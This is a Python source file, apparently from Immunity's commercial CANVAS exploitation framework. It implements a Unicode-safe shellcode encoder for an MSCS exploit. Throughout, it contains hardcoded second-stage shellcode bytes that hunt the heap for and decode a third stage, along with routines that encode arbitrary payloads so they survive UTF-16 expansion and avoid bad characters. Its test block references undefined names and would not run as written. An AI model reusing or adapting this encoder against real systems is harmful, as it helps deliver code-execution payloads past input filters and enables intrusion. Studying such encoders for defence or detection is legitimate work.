#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information


#CANVAS Unicode Encoder v 0.1 currently in the process of getting
#ported over to work with the new framework - so for now consider this
#file just a placeholder and technology demonstration. Few people
#actually have MSCS, so this is not going to be holding back any
#important demonstrations, but is still worthwhile bedtime reading.


#see Chris Anley's paper on www.ngssoftware.com for the original
#paper describing this technique. Uunfortunately his paper ignores how 
#unicode (utf16) is
#actually working in win32 in many cases.
#This python encoder does, in fact, actually conform to the
#win32 UTF-16 implementation as I see it...YMMV

#Note on second stage shellcode:
#The second stage shellcode hunts through the heap for the third stage shellcode

#These routines makes unicode shellcode buffers (actually, they are straight
#ascii buffers that the target will make unicode - annoying us
#greatly)

#writeablereg=string [eax,ebx,esi,etc] of a register that points
#to writable memory.
#ptrtousreg=string [eax,ebx,etc] of a register that points to the
#shellcode itself
#offset=offset from ptrtousreg where our shellcode (encoded) starts.

from random import Random
from exploitutils import *

#w32shell no longer exists in the new framework...
#import w32shell

#several dictionaries that we use.

#pop eax is 0x58
#byte of pushl 
pushDict={}
pushDict["eax"]="\x50"
pushDict["ebx"]="\x53"
pushDict["edx"]="\x52"
pushDict["ecx"]="\x51"
pushDict["esi"]="\x56"
pushDict["edi"]="\x57"

popDict={}
popDict["eax"]="\x58"
popDict["ecx"]="\x59"

decDict={}
decDict["ecx"]="\x49"

incDict={}
incDict["ecx"]="\x41"
incDict["ebx"]="\x43"

#does a memory operation referencing this register as a nop
#eg. 00 6d 00 is add byte ptr [ebp], ch
#these are 3 byte nops that do realign for us
nopDict={}
nopDict["ebp"]="\x6d"
nopDict["esi"]="\x6e"
nopDict["edi"]="\x6f"
nopDict["eax"]="\x70"
nopDict["ecx"]="\x71"
nopDict["edx"]="\x72"
nopDict["ebx"]="\x73"

#add byte ptr [edx],ah == 0x20, etc
#these "nops" will fill up two bytes and do nothing, hopefully
twobytenopDict={}
twobytenopDict["edx"]="\x22"
twobytenopDict["eax"]="\x20"
twobytenopDict["ecx"]="\x21"
twobytenopDict["ebx"]="\x23"
twobytenopDict["esi"]="\x26"


#this shellcode takes in 2 words, which get added together to produce
#the size, then it ununicodes the next "size" bytes
#this has a hardcoded search string - check out createSecondStage() for a 
#better version.
secondstage=""
secondstage+="\xeb\x47\x5b\x8b\x33\x8b\x7b"
secondstage+="\x04\x01\xfe\x89\xf1\xbb"
secondstage+="\x01\x00\x17\x00"
secondstage+="\x43\x81\x3b"
secondstage+="\x5e\x00\x5b\x00"
secondstage+="\x74\x02\xeb\xf5\x83\xc3"
secondstage+="\x04\x81\x3b"
secondstage+="\x51\x00\x59\x00"
secondstage+="\x74\x02"
secondstage+="\xeb\xe8\x83\xeb\x04\x89\xda\x53"
secondstage+="\x87\xf3\x8a\x06\xc0\xe0\x04\x46"
secondstage+="\x46\x8a\x1e\x80\xe3\x0f\x08\xd8"
secondstage+="\x88\x02\x46\x46\x42\xe2\xeb"
secondstage+="\x5b\xff\xd3\xe8\xb4\xff\xff\xff"



#make this a global so everyone can use it
nop="NOP"
#0021 is add [ecx],ah
addword="\x21"
incebx=incDict["ebx"]
global badchars
badchars=""
align=1


def createSecondStage(startaddress,firsttwobytes):
    #print "First two bytes in createSecondStage of makeunicode2.py: %s"%(prettyprint(firsttwobytes))
    firstbytes=nibbleencode(firsttwobytes[0])
    secondbytes=nibbleencode(firsttwobytes[1])
    
    secondstage=""
    secondstage+="\xeb\x47\x5b\x8b\x33\x8b\x7b"
    secondstage+="\x04\x01\xfe\x89\xf1\xbb"
    secondstage+=intel_order(startaddress)
    secondstage+="\x43\x81\x3b"
    secondstage+=firstbytes[0]+"\x00"+firstbytes[1]+"\x00"
    secondstage+="\x74\x02\xeb\xf5\x83\xc3"
    secondstage+="\x04\x81\x3b"
    secondstage+=secondbytes[0]+"\x00"+secondbytes[1]+"\x00"
    secondstage+="\x74\x02"
    secondstage+="\xeb\xe8\x83\xeb\x04\x89\xda\x53"
    secondstage+="\x87\xf3\x8a\x06\xc0\xe0\x04\x46"
    secondstage+="\x46\x8a\x1e\x80\xe3\x0f\x08\xd8"
    secondstage+="\x88\x02\x46\x46\x42\xe2\xeb"
    secondstage+="\x5b\xff\xd3\xe8\xb4\xff\xff\xff"
    return secondstage

    
#returns a string of the added word
def addeax(num):
    if nop=="NOP":
        print "ERROR: NOP NOT INTIALIZED!"
        
    result=""
    result+="\x05"+chr(num)+"\x01"
    result+=nop
    return result

#2d is dash, btw
#returns a string of the added word
def subeax(num):
    if nop=="NOP":
        print "ERROR: NOP NOT INTIALIZED!"
        
    result=""
    result+="\x2d"+chr(num)+"\x01"
    result+=nop
    return result

def getah(num):
    return (num & 0xff00 ) / 0x100

#returns str(result), int(neweax)
#we go into this byte ahigned, and leave byte ahigned
def get_correct_ah(oldeax,desired_ah):
    global badchars
    result=""
    neweax=oldeax
    ah=getah(oldeax)

    #print "Get Correct AH: %x" % (desired_ah)
    if ah==desired_ah:
        #print "AH is already desired"
        return (result,oldeax)

    #check ahl sub codes
    for i in range(1,0x7f):
        if chr(i) not in badchars and getah(oldeax - (0x01000000 + i*0x0100)) == desired_ah:
            #we found a way to subtract to get what we ant
            result+=subeax(i)
            neweax=oldeax-(0x01000000 + i*0x100)
            return (result,neweax)

    #check ahl add codes
    for i in range(1,0x7f):
        if  chr(i) not in badchars and getah(oldeax + (0x01000000 + i*0x0100)) == desired_ah:
            #we found a way to subtract to get what we ant
            result+=addeax(i)
            neweax=oldeax+(0x01000000 + i*0x100)
            return (result,neweax)

    #otherwise, we cannot add or subtract to get what we want, let's add
    #0x7f to eax and try again
    result+=addeax(0x7f)
    neweax=oldeax+0x01000000+0x7f*0x100
    (newresult,neweax)=get_correct_ah(neweax,desired_ah)
    result+=newresult
    return (result,neweax)


def get_correct_char(ah,ch):
    global badchars
    if badchars=="":
        print "BADCHARS NOT INTIALIZED!"
        
    for i in range(1,0x7f):
        if ah+i==ord(ch) and chr(i) not in badchars:
            return chr(i)
    return ""
        
#this function returns the "string" that gets added to result to
#ahso returns the new vahue for eax
#ahso returns the new vahue for the character buffer (can't have > 0x7f)
#decode one character
#current_eax is eax at the time of entry
#execution is on single byte when we enter this function
#and double byte when we leave if result!=""
def do_character(current_eax,ch,even):
    result=""
    #get ah which is what we actually add
    neweax=current_eax
    ah = getah(neweax)
    
    #if we get a free character and it happens to be something
    #we can just throw in, let's do that
    if (even and ord(ch)<=0x7f and ord(ch)>0 and ch not in badchars):
        newch=ch
        align=1
        return (result,neweax,newch,align)


    #if even, then we still have to change the character we output
    #and do some addition to it
    #max character is 0x7f, minumum character is 0x01
    if (even):
        newch=get_correct_char(ah,ch)
        #can we do the character without adding to ah?
        if newch!="":
            #yes we can
            result+=incebx
            #add what we ahready have in ah to [ecx]
            result+=addword
            #print "AH=%x ch=%x m=%x" % (ah,ord(ch),abs(ord(ch)-ah))
            align=0
            return (result,current_eax,newch,align)

        #otherwise we have to add something to ah to get this thing rolling
        #we handle nulls speciahly because we have to "wrap" to do them
        if ord(ch)==0:
            target=0x100
        else:
            target=ord(ch)

        #we let get_correct_ah do the heavy work for us
        #TEST: 0xff
        (newresult,neweax)=get_correct_ah(neweax,target-1)
        result+=newresult
        result+=incebx
        result+=addword
        newch="\x01"
        align=0
        return (result,neweax,newch,align)

    else:
        #not even, so our max character is actually 0
        #special case - we ahready have a 0, so if ch is 0, then we
        #got lucky
        #note: newch is ahways "" in the "odd" case
        if ord(ch)==0x00:
            align=1
            #print "Encoded a 0x00 - got lucky"
            return (result,neweax,"",align)

        (newresult,neweax)=get_correct_ah(neweax,ord(ch))
        result+=newresult
        result+=incebx
        result+=addword
        align=0
        return (result,neweax,"",align)

    
def unicodebuf(writablereg,ptrtousreg,offset,buffer,increg):
    result=""

    #replace % and $ in case a register comes in with those attached
    writablereg.replace("%","")
    writablereg.replace("$","")

    ptrtousreg.replace("%","")
    ptrtousreg.replace("$","")

    increg.replace("%","")
    increg.replace("$","")
    

    if not nopDict.has_key(writablereg):
        print "Can't find nop for that \"register\": "+writablereg
        print "FAILED TO ENCODE!"
        return ""

    #ok, now we have a nop

    popeax=popDict["eax"]
    pusheax=pushDict["eax"]
    popecx=popDict["ecx"]
    incecx=incDict["ecx"]

    #first we set ecx to point to the first byte to modify
    result+=pushDict[ptrtousreg]+nop
    result+=popeax+nop
    #0x05 WORD will add a word to eax
    #we need to add this one to subtract it later
    addval=offset / 256 +1
    #add 0x4c00ADDVAL00,%eax
    result+="\x05"+chr(addval)+"\x4c"
    result+=nop
    #sub 0x4c000100,%eax
    result+="\x2d\x01\x4c"
    result+=nop
    result+=pusheax+nop
    result+=popecx+nop

    #hopefully this will be 0
    #we now will set ecx to point exactly where it needs to be
    #by single increments
    modval=offset % 256
    i=0
    while i<modval:
        #inc eax
        result+=incecx+nop
        i=i+1

    #ok, now ecx is pointing directly at where we want to decode
    #first we set eax to 01000100
    result+="\x68\x01\x01"
    result+=nop
    result+=popeax+nop

    i=0
    #initialization value
    current_eax=0x01000100
    #true if we get a character for free
    even=1
    #this is the buffer that we use to store the characters we get for free
    #and will place at our "offset"
    charbuf=""
    align=1
    while i<len(buffer):

        (newresult,neweax,newchar,align)=do_character(current_eax,buffer[i],even)
        #print "encoding %2.2x New Eax=0x%8.8x, newch=%s" % (ord(buffer[i]),neweax,prettyprint(newchar))
        if newchar=="\x00":
            print "Some sort of error in encoder: newchar is 0 on %x!" % (ord(buffer[i]))
        
        result+=newresult
        if align!=1:
            #print "realigning with a nop"
            result+=nop
            align=1

        #increment ecx to move to the next character
        result+=incecx
        result+=nop
            
        current_eax=neweax
        charbuf+=newchar
        i=i+1
        even=not even
        
    #done!
    return (result,charbuf)

    
#let's not mess up our tty
def prettyprint(instring):
    tmp=""
    for ch in instring:
       if ch.isalpha():
           tmp+=ch
       else:
           value="%x" % ord(ch)
           tmp+="["+value+"]"
       
    return tmp


#print it out like a c array
def cstyleprint(instring):
    tmp="\""
    #startstring="unicodeloop+="
    startstring=""
    i=1
    print "%s" % startstring
    for ch in instring:
        tmp+= "\\x%2.2x" % (ord(ch))
        if i  % 8 ==0:
            tmp+= "\"\n%s\"" % (startstring) 
        i+=1
        
    tmp+="\"\n"        
    return tmp

#do what the windows program is going to do to us
#see the showunicode.py for the real translation
def unicodeexpand(instring):
    tmp=""
    for ch in instring:
        tmp+="\x00"
        tmp+=ch

    return tmp


#returns a list with the two size words as strings
#no bad characters are allowed
def getsizewords(size,badchars):
    wordslist=[]
    word1=0
    word2=0
    g=Random()
    while hasbadchar(word1,badchars) and hasbadchar(word2,badchars):
        word1=g.randrange(0x7fffffff)
        word2=size-word1

    wordslist.append(word1)
    wordslist.append(word2)
    return wordslist


def nibbleencode(instring):
    global badchars
    results=""
    #gotta avoid 0x40
    mask=0x50
    for i in instring:
        och=ord(i)
        #print "och=%x" % (och)
        first=((och & 0xf0) >> 4 ) | mask
        #print "first=%x" % (first)
        second=(och & 0x0f) | mask
        #print "second=%x" %  (second)
        #here we avoid 0x5c
        if chr(first) in badchars:
            first=(first-0x10)
        if chr(second) in badchars:
            second=(second-0x10)
        results+=chr(first)+chr(second)
        
    return results



nop=nopDict["esi"]

#creates good shellcode for the MSCS bug.
#return it as a string
def getMSCSshellcode(shellcode):
    """
    Creates shellcode useful for MSCS exploits
    
    """
    #HERE WE HARDCODE THIS FOR getMSCSshellcode
    global badchars
    badchars="\x00\x40\x2f\x5c"
    #print "Running unicode shellcode tester v 0.1"
    #shellcode="\xeb\xfe"
    #fake 2 size words

    #set up the array of characters you can't have here
    #in this case, no zeros and no @ signs and no \ or /
    #badchars="\x00\x40\x2f\x5c"

    realshellcode=shellcode
    size=len(realshellcode)
    #print "Encoding %d bytes of realshellcode" % len(realshellcode)
    sizewords=getsizewords(size,badchars)
    shellcode=createSecondStage(0x00170001,realshellcode[:2])
    #when added together these two will == size
    shellcode+=intel_order(sizewords[0])
    shellcode+=intel_order(sizewords[1])
    #print "word1="+str(sizewords[0])+" word2="+str(sizewords[1])
    #print "size="+str(sizewords[0]+sizewords[1])

    
    writable="esi"
    pointertoshellcode="ebx"
    totallength=256*5
    increg="ecx"
    #nop=nopDict[writable]
    (test,charbuf)=unicodebuf(writable,pointertoshellcode,totallength,shellcode,increg)
    #we come out of unicodebuf realigned on one byte


    #print "Length of our unicode decoder is %d" % (len(test))
    #we * by 2 because we are going to get unicode expanded
    padlength=(totallength-(len(test)*2))/2
    i=0
    align=1
    padding=""

    #this little loop creates a padding that is actually aligned
    #when it executes and runs into the shellcode
    while i < padlength:
        if align==1:
            #single byte nop, incecx
            padding+="A"
            i=i+1
            align=0
            continue
        #for the last one, realign so we can just slide right into the \xeb
        if padlength-i==1:
            padding+=nopDict[writable]
            align=1
            i=i+1
            continue
        
        padding+=twobytenopDict[writable]
        i=i+1
        continue

    #print "Padlength="+str(padlength)

    
    #use this to replicate what it is like in the exploit itself
    #xchg edx,ebp, call +1, pop eax,  add eax,2, xchg esi,eax
    #testshell="\x87\xea"+"\xe8\x00\x00\x00\x00"+"\x58"+"\x83\xc0"+"\x02"+"\x96"
    
    test=test+padding+charbuf
    
    #print "Done - test size: "+str(len(test))
    #print "Prettyprint of test:"
    #print prettyprint(test)
    #print "Cstyle of test expanded:"
    #print cstyleprint(unicodeexpand(test)[1:])
    #print "Cstyle of raw test:"
    #print cstyleprint(test)
    test2=test+nibbleencode(realshellcode)
    #print "Test2:"
    #print cstyleprint(test2)

    if padlength<0:
        print "WARNING!!! PADLENGTH WAS NOT LARGE ENOUGH!!"
        print "WARNING!!! PADLENGTH WAS NOT LARGE ENOUGH!!"
        print "WARNING!!! PADLENGTH WAS NOT LARGE ENOUGH!!"

    for ch in badchars:
        if ch in test2:
            print "WARNING!!! BADCHAR %s in test2" % ch

    print "Created Unicode Shellcode for MSCS exploit"
    return test2

#this stuff happens.
if __name__ == '__main__':

    print "Running unicode shellcode tester v 0.1"
    #shellcode="\xeb\xfe"
    #fake 2 size words

    #set up the array of characters you can't have here
    #in this case, no zeros and no @ signs and no \ or /
    badchars="\x00\x40\x2f\x5c"

    size=len(realshellcode)
    print "Encoding %d bytes of realshellcode" % len(realshellcode)
    sizewords=getsizewords(size,badchars)
    shellcode=secondstage
    #when added together these two will == size
    shellcode+=intelorder(sizewords[0])
    shellcode+=intelorder(sizewords[1])
    print "word1="+str(sizewords[0])+" word2="+str(sizewords[1])
    print "size="+str(sizewords[0]+sizewords[1])

    
    writable="esi"
    pointertoshellcode="ebx"
    totallength=256*5
    increg="ecx"
    nop=nopDict[writable]
    (test,charbuf)=unicodebuf(writable,pointertoshellcode,totallength,shellcode,increg)
    #we come out of unicodebuf realigned on one byte


    print "Length of our unicode decoder is %d" % (len(test))
    #we * by 2 because we are going to get unicode expanded
    padlength=(totallength-(len(test)*2))/2
    i=0
    align=1
    padding=""

    #this little loop creates a padding that is actually aligned
    #when it executes and runs into the shellcode
    while i < padlength:
        if align==1:
            #single byte nop, incecx
            padding+="A"
            i=i+1
            align=0
            continue
        #for the last one, realign so we can just slide right into the \xeb
        if padlength-i==1:
            padding+=nopDict[writable]
            align=1
            i=i+1
            continue
        
        padding+=twobytenopDict[writable]
        i=i+1
        continue

    print "Padlength="+str(padlength)

    
    #use this to replicate what it is like in the exploit itself
    #xchg edx,ebp, call +1, pop eax,  add eax,2, xchg esi,eax
    #testshell="\x87\xea"+"\xe8\x00\x00\x00\x00"+"\x58"+"\x83\xc0"+"\x02"+"\x96"
    
    test=test+padding+charbuf
    
    print "Done - test size: "+str(len(test))
    print "Prettyprint of test:"
    #print prettyprint(test)
    print "Cstyle of test expanded:"
    #print cstyleprint(unicodeexpand(test)[1:])
    print "Cstyle of raw test:"
    #print cstyleprint(test)
    test2=test+nibbleencode(realshellcode)
    print "Test2:"
    print cstyleprint(test2)

    if padlength<0:
        print "WARNING!!! PADLENGTH WAS NOT LARGE ENOUGH!!"
        print "WARNING!!! PADLENGTH WAS NOT LARGE ENOUGH!!"
        print "WARNING!!! PADLENGTH WAS NOT LARGE ENOUGH!!"

    for ch in badchars:
        if ch in test2:
            print "WARNING!!! BADCHAR %s in test2" % ch
        
